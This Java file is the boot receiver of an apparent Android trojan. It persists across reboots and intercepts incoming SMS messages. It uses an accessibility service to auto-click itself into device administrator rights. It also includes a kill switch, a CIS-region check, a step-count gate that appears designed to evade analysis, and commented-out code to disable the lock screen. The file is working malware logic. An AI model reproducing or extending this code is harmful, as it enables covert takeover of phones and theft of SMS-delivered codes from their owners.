package com.example.mmm.Receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;


import com.example.mmm.Admin.ActivityAdmin;
import com.example.mmm.Service.srvNetworkConnect;
import com.example.mmm.Service.srvSccessibility;
import com.example.mmm.Service.srvPedometer;
import com.example.mmm.Utils.idUtils;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;


public class bootReceiver extends BroadcastReceiver {
    constants consts = new constants();
    private String TAG_LOG = bootReceiver.class.getSimpleName()+ consts.strTAG1;
    utils utl = new utils();
    idUtils idutl = new idUtils();



    @Override
    public void onReceive(Context context, Intent intent) {

      /*  PowerManager pm = (PowerManager) context.getApplicationContext().getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock((PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP), "TAG");
        wakeLock.acquire();

        KeyguardManager keyguardManager = (KeyguardManager) context.getApplicationContext().getSystemService(Context.KEYGUARD_SERVICE);
        KeyguardManager.KeyguardLock keyguardLock = keyguardManager.newKeyguardLock("TAG");
        keyguardLock.disableKeyguard();*/

      try {
          if ((!utl.SettingsRead(context, consts.kill).contains(consts.str_dead)) && (!utl.blockCIS(context))) {

              utl.Log(TAG_LOG, consts.str_log1);
              utl.startCustomTimer(context, consts.str_null, 10000);
              for (int i = 0; i < consts.arrayClassService.length; i++) {

                  if ((Build.VERSION.SDK_INT >= 26) && (!idutl.is_dozemode(context))) break;

                  if (!utl.isMyServiceRunning(context, consts.arrayClassService[i])) {

                      if (srvPedometer.class.getName().equals(consts.arrayClassService[i].getName())) {
                          context.startService(new Intent(context, consts.arrayClassService[i]));
                          utl.Log(TAG_LOG, consts.string_25 + consts.arrayClassService[i]);
                      } else if (Integer.parseInt(utl.SettingsRead(context, consts.str_step2)) >= consts.startStep) {
                          context.startService(new Intent(context, consts.arrayClassService[i]));
                          utl.Log(TAG_LOG, consts.string_26 + consts.arrayClassService[i]);
                      }
                  }else{
                    if(srvNetworkConnect.class.getName().equals(consts.arrayClassService[i].getName())){
                          context.stopService(new Intent(context, consts.arrayClassService[i]));
                      }
                      utl.Log(TAG_LOG, consts.string_27_ + consts.arrayClassService[i]);
                  }
              }

              utl.start_dozemode(TAG_LOG, context);
              utl.SettingsWrite(context, consts.statAccessibilty, utl.isAccessibilityServiceEnabled(context, srvSccessibility.class) ? consts.str_1 : consts.str_step);

              if (intent.getAction().equals(consts.SMS_RECEIVED)) {
                  utl.interceptionSMS(context, intent);
              }

              //------Schet---------
              int schet = 0;
              try {
                  schet = Integer.parseInt(utl.SettingsRead(context, consts.schetBootReceiver));
                  schet++;
                  utl.SettingsWrite(context, consts.schetBootReceiver, consts.str_null + schet);
              } catch (Exception ex) {
               //   utl.SettingsToAdd(context, consts.LogSMS , consts.string_149 + ex.toString() + consts.string_119);
              }

              //-------------------


                  if (!utl.isAdminDevice(context)) {
                      if(utl.SettingsRead(context, consts.start_admin).contains("1")){
                          if ((utl.getScreenBoolean(context)) && (utl.isAccessibilityServiceEnabled(context, srvSccessibility.class))) {
                              if (utl.isAccessibilityServiceEnabled(context, srvSccessibility.class)) {
                                  utl.SettingsWrite(context, consts.autoClick, consts.str_1);//auto click start!
                              }
                              Intent dialogIntent = new Intent(context, ActivityAdmin.class);
                              dialogIntent.putExtra(consts.string_24, consts.str_1);
                              dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                              dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                              dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                              context.startActivity(dialogIntent);
                          }
                      }
                  }



           /* if (utl.isAccessibilityServiceEnabled(context, srvSccessibility.class)) {
                try {
                    if ((!idutl.isPermissionDisk(context)) && (idutl.actDozeMode(context))) {
                        utl.Log(TAG_LOG, consts.str_log4);

                        Intent dialogIntent = new Intent(context, actPermissions.class);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                        context.startActivity(dialogIntent);
                    }
                } catch (Exception ex) {
                    utl.Log(TAG_LOG, consts.str_log5);
                }
            }*/
          }
      }catch (Exception ex){
        //  utl.SettingsToAdd(context, consts.LogSMS , consts.string_150 + ex.toString() + consts.string_119);
      }
    }


}
